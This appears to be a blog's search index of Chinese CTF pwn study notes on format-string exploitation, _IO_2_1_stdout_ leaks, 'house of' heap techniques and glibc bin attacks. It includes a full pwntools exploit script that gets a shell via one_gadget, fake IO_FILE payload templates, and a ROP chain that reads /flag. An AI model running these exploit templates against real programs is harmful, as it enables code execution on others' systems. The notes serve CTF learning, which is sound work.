<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>format利用</title>
    <url>/2024/07/20/Fmt/</url>
    <content><![CDATA[<hr>
<h1 id="格式化字符串利用"><a href="#格式化字符串利用" class="headerlink" title="格式化字符串利用"></a>格式化字符串利用</h1><span id="more"></span>
<p>详细学习关于fmt的利用手法推荐b站国资，以及星盟</p>
<p>关于非栈上格式化字符串的利用在ctf中还是利用比较频繁的 ，可以仔细去学习这一专项。</p>
<p>tips:<br>1、寄存器顺序：rdi、rsi、rdx、rcx、r8、r9.<br>1、%c<br>2、%s<br>3、%p<br>4、%n，%hhn，%hn<br>5、%a<br>这个命令是利用于在程序开启  “FORTIFY“  时，所有的printf都会被_printf_chk所替代。  </p>
<p>_printf_chk与printf主要有以下几点不同：   </p>
<pre><code>1、在使用%n$p时要连续进行打印，如打印%1$p,就需要%1$p,%2$p连续使用。
2、在使用%n时会进行一些检查。
</code></pre>
<p>这时如果程序加了字数限制，漏洞利用就会变得很麻烦。<br>所以这里采用  %a  来进行泄露，但是不同的 是%a是泄露数据，并且是泄露上方的数据与其他格式化字符串截然相反的泄露方向。</p>
<p>6、*<br>eg：%*7$c+%6$hnn<br>上面这个例子的作用就是将栈上第7个的位置的值直接输入到6p这个位置。<br>通常用于read字节较少的情况。<br><br><br><br></p>
<h2 id="栈上格式化字符串（原理）"><a href="#栈上格式化字符串（原理）" class="headerlink" title="栈上格式化字符串（原理）"></a>栈上格式化字符串（原理）</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p>1、由于在32位程序中，系统并不是采用的寄存器传参，所以关于printf的所有参数都会显示在栈上。<br>如同<br><img src="/images/format_stack.png" alt="图片"><br>其中依次存储的数据是prinf的内容、参数1、参数2、printf的返回地址。<br>如果我们用printf来打印其中的地址：</p>
<pre><code>printf(&quot;%p,%p&quot;,&quot;test&quot;,&amp;a);
</code></pre>
<p>首先程序会对函数依次进行以下操作：  </p>
<pre><code>1、读取内容   
2、如果遇到的是普通字符串则输入到缓冲区中      
3、如果遇到的是以%开头或转义字符，则程序进行解析，并作出与之对应的操作    
</code></pre>
<p>进行完这些程序就会打印出下面的结果<br><img src="/images/result.png" alt="图片"><br>第一个地址是“test”的地址，第二个地址是变量a的地址。<br>根据以上的规律我们不难发现利用%p，pritnf就会依次从esp-4的位置打印出地址。<br> 同时我们也可以了解到在使用类如  ”%n$p”  的n参数代表的是相较于格式化字符串的相对位置。</p>
<p>根据以上的例子我们可以知道printf的基本原理，那么利用printf也就一目了然了，printf的利用也是无非在原理的基础利用程序本身的逻辑漏洞，或函数漏洞来进行攻击。<br><br><br><br></p>
<h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><p>1、在64位程序中我们知道，程序改为先用寄存器来进行依次传参，所以原本的</p>
<pre><code>printf(&quot;%p,%p&quot;,&quot;test&quot;,&amp;a);
</code></pre>
<p>就会将%p先存储在rdi中然后剩下的参数就按顺序依次存储在剩下的5个寄存器中。  </p>
<p>所以64位中若是想要泄露栈上的地址应该要先从  %6$p 开始。  </p>
<p>2、除了寄存器传参剩下就和32位程序一致了。   </p>
<br>
<br>   
                        
<p>2、<br>先可以通过例题回忆一下<br>DASCTF<br><img src="/images/dactf_fmtN.png" alt="图片"><br>类似这种read的变量非栈上时，并且只有一个main函数时，就可以利用改写ret的地址为onegadget。   </p>
<pre><code>!/usr/bin/python3
from pwn import *
from LibcSearcher import *
import os

context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
# context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)


#context.terminal = [&#39;xterm&#39;, &#39;-e&#39;]
context.terminal = [&#39;xfce4-terminal&#39;, &#39;-e&#39;]
#终端更换

p=process(&quot;./pwn&quot;)
p= remote(&#39;node5.buuoj.cn&#39;,28406)
libc = ELF(&quot;libc.so.6&quot;)
elf = ELF(&quot;./pwn&quot;)

def op():
    gdb.attach(p)
    pause()

def inter():
    p.interactive()
    
def sa(content,payload):
    p.sendafter(content,payload)
    
def sla(content,payload):
    p.sendlineafter(content,payload)

def uc64():
    u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))

def uc32():
    u32(p.recvuntil(b&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))

def exec_fmt(pad):#自动获取到fmt的pad
    p = process(&quot;./fmt&quot;)
    # send 还是 sendline以程序为准
    p.send(pad)
    return p.recv()
payload=b&#39;%3$p&#39;+b&#39;%6$p&#39;
sa(&quot;keyword&quot;,payload)
p.recvuntil(b&#39;0x&#39;)
got=int(p.recv(12),16)-0x10-libc.sym[&#39;read&#39;]
print(&quot;got=&quot;,hex(got))
p.recvuntil(b&#39;0x&#39;)
stack=int(p.recv(12),16)-0xc8+0x10
tar=stack+0xe0-0x100
print(&quot;tar=&quot;,hex(tar))
print(&quot;stack=&quot;,hex(stack))
p.recvuntil(b&#39;0x&#39;)
one=got+0xf1247
print(&quot;one=&quot;,hex(one))


payload=(b&#39;%&#39;+str(tar&amp;0xffff).encode()+b&#39;c%11$hn\x00&#39;)
p.recvuntil(b&#39;keyword&#39;)
print(&quot;offest=&quot;,hex(offest))
p.send(payload)
#改写当前链为ret的链

payload=(b&#39;%&#39;+str((one&amp;0xffff)).encode()+b&#39;c%37$hn\x00&#39;)
p.recvuntil(b&#39;keyword&#39;)
p.send(payload)
p.recv()
 #改ret第二位为one

payload=(b&#39;%&#39;+str((tar&amp;0xffff)+2).encode()+b&#39;c%11$hn\x00&#39;)
p.recvuntil(b&#39;keyword&#39;)
print(&quot;offest=&quot;,hex(offest))
p.send(payload)
#ret地址+2

print(&quot;offest=&quot;,hex(offest))
one=one&gt;&gt;16
payload=(b&#39;%&#39;+str((one&amp;0xffff)).encode()+b&#39;c%37$hn\x00&#39;)
print(&quot;offest=&quot;,hex(offest))
p.recvuntil(b&#39;keyword&#39;)
p.send(payload)
#改ret地址+2的第二位地址为one

inter()
</code></pre>
<p>首先肯定是利用prinf先打印出栈地址和libc地址。<br>再用gdb调试看看栈的调用情况.</p>
<p><img src="/images/gdb_fmt.png" alt="图片"></p>
<p>可以看到ret链的是__libc_start_main函数，只有这一个所以没办法直接改。<br>不过我们看到后面有一条调用链，有两个一个以上的调用，所以可以将这个后面的调用链改成ret的调用链，即将 0x7fffffffe57c 改为 0x7fffffffe218,这样就会链上ret链。</p>
<p><img src="/images/fmt_ret.png" alt="图片"></p>
<p>像这样这就链起来辣！<br>链起来之后就只要修改<br><img src="/images/gdb_ret.png" alt="图片"><br>将这一部分修改为onegadget就可以了，其中在修改时很大概率不能四字节一起修，但是one与ret的地址又有三字节不相同，所以需要两字节修改两次，或者一字节修改三次。这时需要ret地址+1或2来对剩下的地址再次进行修改。        </p>
<p>修改完之后就可以getshell了。</p>
<hr>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>fmt</tag>
      </tags>
  </entry>
  <entry>
    <title>_IO_2_1_stdout_</title>
    <url>/2024/07/19/IO_2_1_stdout/</url>
    <content><![CDATA[<hr>
<h1 id="IO-2-1-stdout-的利用（速成）"><a href="#IO-2-1-stdout-的利用（速成）" class="headerlink" title="_IO_2_1_stdout_的利用（速成）"></a>_IO_2_1_stdout_的利用（速成）</h1><p>详情可看：<br><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">hollk</a> </p>
<p><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_2">国资</a></p>
<h3 id="IO-FILE-plus结构体"><a href="#IO-FILE-plus结构体" class="headerlink" title="_IO_FILE_plus结构体"></a>_IO_FILE_plus结构体</h3><pre><code>struct _IO_FILE_plus &#123;
    FILE file;
    const struct _IO_jump_t *vtable;
&#125;
</code></pre>
<p>其中32 位的file到 vtable 偏移为 0x94，64 位偏移为 0xd8</p>
<br>

<h3 id="IO-2-1-stdout-结构体"><a href="#IO-2-1-stdout-结构体" class="headerlink" title="_IO_2_1_stdout_结构体"></a>_IO_2_1_stdout_结构体</h3><p><img src="/images/stdout.png" alt="图片">   </p>
<p>关于利用stdout来泄露libc主要设置以下结构的值：   </p>
<pre><code>1、flag为0xfbad18xx，一般为0xfdab1800

2、更改_IO_read_ptr、_IO_read_end、_IO_read_base指针的值为0.

3、_IO_write_base改为需要泄露的地址，_IO_write_ptr改为泄露地址的终止值。
</code></pre>
<p>改完了这些，就可以通过调用printf或者puts函数来打印出地址了。</p>
<hr>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>IO</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>house of模板</title>
    <url>/2024/07/25/house%20of/</url>
    <content><![CDATA[<h1 id="house-of-利用模板及利用条件"><a href="#house-of-利用模板及利用条件" class="headerlink" title="house of 利用模板及利用条件"></a>house of 利用模板及利用条件</h1><span id="more"></span>

<hr>
<p><em>tips:</em><br>1、于glibc2.34后glibc就移除了hook一类<br>2、_malloc_assert于glibc2.35被移除</p>
<h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>原文链接：<a href="https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6">https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6</a><br><br><br><em>条件</em><br>glibc版本：任何版本<br>地址：libc_base、heap<br>可触发IO流:FSOP、_malloc_assert或存在可以进入IO链的函数如puts<br><br></p>
<p><em>调用链： </em><br>1、_IO_wfile_jumps-&gt;_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode(fp)-&gt;伪造file<br>2、exit() –&gt; __run_exit_handlers –&gt; _IO_cleanup –&gt; _IO_flush_all_lockp –&gt; _IO_wfile_seekoff–&gt; _IO_switch_to_wget_mode –&gt; _IO_switch_to_wget_mode 的 call rax</p>
<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><pre><code>fake_io_addr=heapbase+0xb00 # 伪造的fake_IO结构体的地址
next_chain = 0
fake_IO_FILE=p64(rdi)         #_flags=rdi
fake_IO_FILE+=p64(0)*7
fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx
fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x68, &#39;\x00&#39;)
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x88, &#39;\x00&#39;)
fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xa0, &#39;\x00&#39;)
fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xc0, &#39;\x00&#39;)
fake_IO_FILE += p64(1) #mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xd8, &#39;\x00&#39;)
fake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr
</code></pre>
<p>其中fake_io_addr为我们伪造IO_FILE结构体的地址。<br>vtable函数，如果打FSOP则改成IO_wifle_jumps+0x30.<br>rdi、rdx为我们调用函数的参数。  </p>
<br>

<p>例子orw：  </p>
<pre><code>Fake_IO_File_Structure = IO_FILE_plus_struct(fake_io_addr)
Fake_IO_File_Structure._IO_save_base = p64(1)                                           # RCX
Fake_IO_File_Structure._IO_backup_base = p64(fake_io_addr + 0x120 - 0xa0)               # mov    rdx, qword ptr [rax + 0x20]
Fake_IO_File_Structure._IO_save_end = p64(setcontext)                                   # call   qword ptr [rax + 0x18]
Fake_IO_File_Structure._wide_data = p64(fake_io_addr + 0x30)                            # mov    rax, qword ptr [rdi + 0xa0]
Fake_IO_File_Structure._offset = 0
Fake_IO_File_Structure._vtable_offset = 0
Fake_IO_File_Structure._mode = 1
Fake_IO_File_Structure.vtable = p64(libc_base + libc.sym[&#39;_IO_wfile_jumps&#39;] + 0x30)

Fake_IO_File_Structure = bytes(Fake_IO_File_Structure)
Fake_IO_File_Structure += p64(0) * 6
Fake_IO_File_Structure += p64(fake_io_addr + 0x40)                                      # mov    rax, qword ptr [rax + 0xe0]
Fake_IO_File_Structure = Fake_IO_File_Structure.ljust(0x120, b&#39;\x00&#39;) + p64(fake_io_addr + 0x128) + p64(ret)
rop = p64(rdi) + p64((fake_io_addr &gt;&gt; 12) &lt;&lt; 12) + p64(rsi) + p64(0x1000) + p64(rdx_r12) + p64(7) * 2 + p64(mprotect) + p64(fake_io_addr + 0x178) + asm(shellcraft.cat(&#39;/flag&#39;))

Fake_IO_File_Structure += rop
</code></pre>
<br>
<br> 

<h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p><em>条件</em><br>1、glibc：2.23-2.29<br>2、malloc size无限制，或size可以很大<br>3、至少可以溢出8字节</p>
<p><em>利用流程：</em></p>
<pre><code>修改topchunk_size为0xffffffffffffffff
计算target_size=target_addrtopchunk_addr-0x30
malloc一个chunk
getshell
 
 
</code></pre>
<br>
 
<h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><p>个人感觉这个house of apple与house of cat不同必须要泄露heap地址，毕竟apple需要两个伪造的地址来控制eip，除非你知道栈地址。<br>具体原理请看:<a href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a>       </p>
<br>
<em>适用版本</em>    
glibc:2.34-         

<br>
<em>条件</em>                               

<p>1、能控制_IO_FILE的vtable和_wide_data，或者可以largebinattack<br>2、可以泄露heap和libc地址<br>3、可以执行IO流，exit、malloc assert、返回main函数…….  </p>
<br>
<br>

<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在_IO_2_1_stderr&#x2F;stdout&#x2F;stdin_中，vatable函数在glibc2.24之后，增加了范围检查。<br>但是在_IO_wide_date这个结构体成员变量中，存在一个_wide_vtable成员变量，这个功能与vatble一致,但是与file结构体中的vtable不同的是，在这个_wide_vtable中是没有范围检查的直接调用宏了。<br><br></p>
<p><em>所以根据上述描述可以将</em><br>    _IO_wide_date覆盖成我们的可控heap地址<br>    vtable覆盖成_IO_wfile_jmups<br>    _wide_vtable劫持为我们的rip        </p>
<h3 id="共有三种v劫持IO流的方式"><a href="#共有三种v劫持IO流的方式" class="headerlink" title="共有三种v劫持IO流的方式"></a>共有三种v劫持IO流的方式</h3><pre><code>_IO_wfile_overflow
_IO_wfile_underflow_mmap
_IO_wdefault_xsgetn
</code></pre>
<br>

<h3 id="1、-利用-IO-wfile-overflow"><a href="#1、-利用-IO-wfile-overflow" class="headerlink" title="1、 利用_IO_wfile_overflow"></a>1、 利用_IO_wfile_overflow</h3><p><em>调用链</em>     </p>
<pre><code>_IO_wfile_overflow
    _IO_wdoallocbuf
        _IO_WDOALLOCATE
            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)
</code></pre>
<br>
<em>伪造file及_IO_wide_date_</em>

<pre><code>_flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格
vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可
_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
_wide_data-&gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0
_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
</code></pre>
<p><em>条件绕过</em>        </p>
<pre><code>需要满足f-&gt;_flags &amp; _IO_NO_WRITES == 0并且f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0和f-&gt;_wide_data-&gt;_IO_write_base == 0
需要满足fp-&gt;_wide_data-&gt;_IO_buf_base != 0和fp-&gt;_flags &amp; _IO_UNBUFFERED == 0。
</code></pre>
<br>
    模板（getshell）
<em>需要将伪造chunk的pre_size位伪造成  '  sh;'  或者  ';sh\x00'  </em>    


<pre><code>    fake_io_file = p64(0)*2 + p64(1) + p64(2)
    fake_io_file = fake_io_file.ljust(0xa0 - 0x10, b&#39;\0&#39;) + p64(chunk_addr+0x100) # _wide_data
    fake_io_file = fake_io_file.ljust(0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff) # _mode
    fake_io_file = fake_io_file.ljust(0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps) # vtable
    fake_io_file = fake_io_file.ljust(0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(chunk_addr+0x200)
    fake_io_file = fake_io_file.ljust(0x200-0x10,b&#39;\0&#39;)+p64(0)*13+ p64(sys)
    
</code></pre>
<br>
<br>

<h3 id="2、利用IO-wfile-underflow-mmap"><a href="#2、利用IO-wfile-underflow-mmap" class="headerlink" title="2、利用IO_wfile_underflow_mmap"></a>2、利用IO_wfile_underflow_mmap</h3><p><em>调用链</em><br>    _IO_wfile_underflow_mmap<br>        _IO_wdoallocbuf<br>            _IO_WDOALLOCATE<br>                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)          </p>
<br>
<em>伪造</em>   

<pre><code>_flags设置为~4，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有个空格
vtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可
_IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)
_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)
_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
_wide_data-&gt;_IO_save_base设置为0或者合法的可被free的地址，即满足*(A + 0x40) = 0
_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
</code></pre>
<br>
<em>条件绕过</em>       

<pre><code>需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base == NULL和fp-&gt;_wide_data-&gt;_IO_save_base == NULL。        
</code></pre>
<br>

<h3 id="3、利用-IO-wdefault-xsgetn"><a href="#3、利用-IO-wdefault-xsgetn" class="headerlink" title="3、利用_IO_wdefault_xsgetn"></a>3、利用_IO_wdefault_xsgetn</h3><p><em>调用链</em>    </p>
<pre><code>_IO_wdefault_xsgetn
    __wunderflow
        _IO_switch_to_wget_mode
            _IO_WOVERFLOW
                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)
</code></pre>
<br>
<em>伪造</em>       

<pre><code>_flags设置为0x800
vtable设置为_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn即可
_mode设置为大于0，即满足*(fp + 0xc0) &gt; 0
_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr设置为0，即满足*(A + 8) = *A
_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18)
_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
_wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满足*(B + 0x18) = C
</code></pre>
<br>

<p><em>条件绕过</em>   </p>
<pre><code>直接设置fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end，使得count为0，不进入if分支。
随后当more != 0时会进入__wunderflow。   
要想调用到_IO_switch_to_wget_mode，需要设置fp-&gt;mode &gt; 0，并且fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0。
当满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base时就会调用_IO_WOVERFLOW(fp)。
</code></pre>
<br>
<br>

<hr>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>IO</tag>
        <tag>house of</tag>
      </tags>
  </entry>
  <entry>
    <title>bin</title>
    <url>/2024/07/18/bin/</url>
    <content><![CDATA[<hr>
<h1 id="堆中bin的利用"><a href="#堆中bin的利用" class="headerlink" title="堆中bin的利用"></a>堆中bin的利用</h1><span id="more"></span>

<p><em>tips:</em><br>1、fastbin、tachebin遵循先进后出<br>2、unsortedbin、largebin、smallbin遵循先进先出<br>3、unsortedbin attack于glibc2.27时添加了保护<br>4、unsortedbin attack于glibc2.29被彻底扼杀<br>5、在glibc2.27及以上中因为添加了tachebin，所以低于0x420的chunk不会进unsortedbin。<br>6、在glibc2.27以下的大于0x80进unsortedbin，大于0x3f0进largebin。<br>7、largebin的公差为0x40<br>8、tachebin于glibc2.28之前并不会检查double free  </p>
<h2 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h2><p>个人觉得fastbin attack总结起来其实利用就只有两个，double free、地址任意分配。   </p>
<p>1、首先fastbin是由什么来进行管理的呢？<br>答案是fastbinY数组进行管理，这个数组是main_arena的一个成员变量，数组的最大下标是7.<br>由fastbin所管理的chunk，根据其chunk的大小的不同从而进入不同的fastbinY中，大小顺序是从0x20-0x80，依次对应不用的数组下标。    </p>
<p>1、在fastbin中，它的prev_in_use位总是为1的。</p>
<pre><code>static void _int_free (mstate av, mchunkptr p, int have_lock)
&#123;
size = chunksize (p);    //获取p的size
check_inuse_chunk(av, p);//检查p的物理相邻的下一个堆块的inuse位是否置1

//检查p的大小是否小于global_max_fast
if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())
    #if TRIM_FASTBINS
        //检查p物理相邻的堆块是否是top chunk
        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)
    #endif
    ) 
&#123;
    //检查p的物理相邻下个堆块是否存在,且大小是否满足最小和最大要求
    if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)
        || __builtin_expect (chunksize (chunk_at_offset (p, size))
                &gt;= av-&gt;system_mem, 0))
        &#123;.......&#125;

    //对chunk的data块通过memset赋值，但是默认情况下是不进行操作    
    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);
    //设置 malloc_state的flag
    set_fastchunks(av);

    //获取p对应大小的fastbinY的索引
    unsigned int idx = fastbin_index(size);
    //fb指向对应大小的fastbinY的地址
    fb = &amp;fastbin (av, idx);

    /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */
    // old为 对应大小的fastbinY的fd值，也就是第一个对块的地址
    mchunkptr old = *fb, old2;
    unsigned int old_idx = ~0u;
    
    do
    &#123;
        // Check that the top of the bin is not the record we are going to add
        //检查 fastbin中对应的bin的第一项 是否 等于 p (新加入的堆块)
            if (__builtin_expect (old == p, 0))
        &#123;
            errstr = &quot;double free or corruption (fasttop)&quot;;
            goto errout;
        &#125;
        //获取 fastbin中对应的bin的第一项的索引。
            if (have_lock &amp;&amp; old != NULL)
            old_idx = fastbin_index(chunksize(old));
        //让  p 的fd指向 顶部的fastbin块
            p-&gt;fd = old2 = old;
    &#125;
    while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);
    //catomic_compare_and_exchange_val_rel 功能是 如果*fb等于old2，则将*fb存储为p，返回old2；
    // *fb=p 也就是 让对应fastbin的fd指向 p(新加入的堆块)

    //检查fastbin中对应的bin的第一项的大小是否与p(要添加的块)的大小相同。
    if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0))
    &#123;
            errstr = &quot;invalid fastbin entry (free)&quot;;
            goto errout;
    &#125;
&#125;
&#125;
</code></pre>
<p>2、在fastbin中常利用的attck就是double free<br> &#x2F;&#x2F;检查 fastbin中对应的bin的第一项 是否 等于 p (新加入的堆块)</p>
<pre><code>        if (__builtin_expect (old == p, 0))
    &#123;
                errstr = &quot;double free or corruption (fasttop)&quot;;
                goto errout;
    &#125;
</code></pre>
<p>看到这一段源码，old对应的是先前free的chunk，p是当前free的chunk。如果两相同的chunk连续进行free程序就会抛出异常。<br>但是我们同时也可以看到，fastbin对doublefree的检查是十分松散的，因为这里只判断了old与p的指针相等。所以我们只需要A-》B-》A这样进行free，就可以绕过检查。   </p>
<p>3、分配顺序<br>fastbin分配的chunk总是fastbinY数组所指向的第一个chunk。  </p>
<p>fastbin是一个只有fd的单向链表并遵循先进后出的分配顺序。   </p>
<p>4、attack<br>在fastbin attack中利用的除了double free，还有控制fd指针来进行任意地址分配。不过在进行分配之前需要满足一些条件来绕过检查。  </p>
<pre><code>检测1：检测你要malloc的freechunk的大小是否在该chunk所在的fastbin链的大小尺寸范围内（例如：一个fastbin链所存储的chunk大小必须在0x30-0x40之间，但是你要申请的这个chunk却是0x50，那么就会程序就报错退出）。  

检测2：检测你这个freechunk的size成员的PREV_INUSE为是否为1，为1才可以通过检测。
</code></pre>
<p>所以我们选取的攻击目标地址的偏移size成员数值的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位都要为1，比如当前fastbin所能管理的freechunk大小为0x70~0x80，而伪造的size成员处的数值为0x71、0x72这样的数值不能够符合要求的，但0x7f这样的地址就可以满足需要，因此构造完之后，攻击目标地址的伪造size成员成员数值的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位都要为1，0x7f就可以满足.  </p>
<br>
<br>

<h2 id="Unsortedbin-attack"><a href="#Unsortedbin-attack" class="headerlink" title="Unsortedbin attack"></a>Unsortedbin attack</h2><p>作用：将P-&gt;bk-&gt;fd赋值为P-&gt;fd。</p>
<p>1、首先是unsortedbin 的分配机制，超出了fastbin和tachebin范围的free chunk就会进入unsortedbin中，并且unsortedbin是先从末尾取出chunk进行分配的，后free的chunk会进入先free的chunk的前面。unsortedbin顾名思义，未分类的chunk，所以只要用户重新申请了chunk，unsortedbin中的chunk就会被重新分类，按照其chunk的大小分别进入smallbin、largebin…中。在glibc2.26版本及以下时，还只有fastbin没有tachebin，这时候只要用户free的是大于0x80这个值时就会被free进unsortedbin中。</p>
<p>2、unsortedbin的利用。主要就是利用其中的bk指针</p>
<pre><code>//bck是倒数第二个chunk，victim里存的是倒数第一个chunk
/* remove from unsorted list *   
if (__glibc_unlikely (bck-&gt;fd != victim))
        malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);
unsorted_chunks (av)-&gt;bk = bck;
bck-&gt;fd = unsorted_chunks (av);       
</code></pre>
<p>当倒数第一个chunk被取出来时 “ unsorted_chunks (av)-&gt;bk &#x3D; bck; “对bk进行赋值，然后” unsorted_chunks (av)-&gt;bk &#x3D; bck; “这里bck就是我们伪造的fake_bk，看到”fake_bk-&gt;fd&#x3D;av； “，这里直接被赋值成了av，也就是main_arena。<br>  <br><br>不过由于我们突然插入的chunk，破坏了其bk链和fd链，后续的unsortbin在进行分配时可能会出现问题。</p>
<p>测试案例</p>
<pre><code>How2heap(使用 gcc -g 进行编译)
1 //gcc hollk.c -g -no-pie -o hollk
2 #include &lt;stdio.h&gt;
3 #include &lt;stdlib.h&gt;
4
5 int main() &#123;
6
7   unsigned long target_var = 0;
8   fprintf(stderr,&quot;&amp;target_var and target_var:\n&quot;);
9   fprintf(stderr, &quot;%p: %ld\n\n&quot;, &amp;target_var, target_var);
10
11   unsigned long *p = malloc(400);
12   fprintf(stderr, &quot;The first chunk_addr at: %p\n&quot;,p);
13
14   malloc(500);
15
16   free(p);
17   fprintf(stderr, &quot;The first chunk_bk is %p\n&quot;,(void *)p[1]);
18
19   p[1] = (unsigned long)(&amp;target_var - 2);
20   fprintf(stderr, &quot;Now,The first chunk_bk is %p\n\n&quot;, (void *)p[1]);
21
22   malloc(400);
23   fprintf(stderr, &quot;target has been rewrite %p: %p\n&quot;, &amp;target_var, (void *)target_var);
24 &#125;
</code></pre>
<br>
<br>

<h2 id="Largebin-attack"><a href="#Largebin-attack" class="headerlink" title="Largebin attack"></a>Largebin attack</h2><p>(总的来说，利用方法与unsortedbin差不多，并且其中的利用效果都一样，只是largebin除了可以利用bk还可以利用bk_nextsize）</p>
<p>1、规则<br>（1）、共有63个bins，每个bin的size域值各不相同，但是公差是一致的。（大于0x3F0的chunk在遍历后进入largebin，反之小于的则进入到smallbin）<br>（2）、由大到小进行存储，若大小一致则按照时间顺序存储。（小的chunk链接到largebin）</p>
<p>2、新增fd_nextsize与bk_nextsize这两指针。fd_nextsize(指向小的chunk的头部)的作用是记录前面第一个与此chunk的size不同的chunk的地址，而bk_nextsize(指向大的chunk的头部)则是记录后面第一个与此chunk的size不同的chunk的地址。（只有第一个chunk的fd&#x2F;bk_nextsize进行记录，其他的默认为0）<br><br><br>3、attack<br>已知largebin对chunk进行操作有三种情况<br>（进行伪造工作的chunk是chunk_B又名P2，chunk_A是P3其size大于P2）</p>
<p>（1）、chunk_A大于chunk_B</p>
<p>（2）、chunk_A小于chunk_B</p>
<p>（3）、chunk_A等于chunk_B</p>
